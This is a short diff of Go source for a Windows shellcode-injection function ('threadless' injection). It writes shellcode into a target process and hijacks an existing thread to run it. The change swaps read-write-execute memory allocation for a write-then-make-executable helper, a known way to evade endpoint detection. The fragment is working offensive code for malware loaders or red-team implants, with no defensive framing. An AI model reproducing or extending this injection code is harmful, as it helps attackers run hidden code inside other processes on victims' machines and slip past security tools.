@@ -12,16 +12,11 @@ import (
 // to point to shellcode (allocated in the target process), then resumes.
 // This avoids creating new threads in the target process.
 func doThreadlessInject(hProc uintptr, pid uint32, sc []byte) error {
-	// Allocate + write shellcode in target
-	addr, _, _ := procVirtualAllocEx.Call(hProc, 0, uintptr(len(sc)),
-		uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(PAGE_EXECUTE_READWRITE))
-	if addr == 0 {
-		return fmt.Errorf("VirtualAllocEx failed")
+	// Allocate + write shellcode in target (RW → write → RX)
+	addr, err := allocateRX(hProc, sc)
+	if err != nil {
+		return fmt.Errorf("allocateRX failed: %w", err)
 	}
-	var w uintptr
-	procWriteProcessMemory.Call(hProc, addr,
-		uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)),
-		uintptr(unsafe.Pointer(&w)))
 
 	// Snapshot threads to find one in the target process
 	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
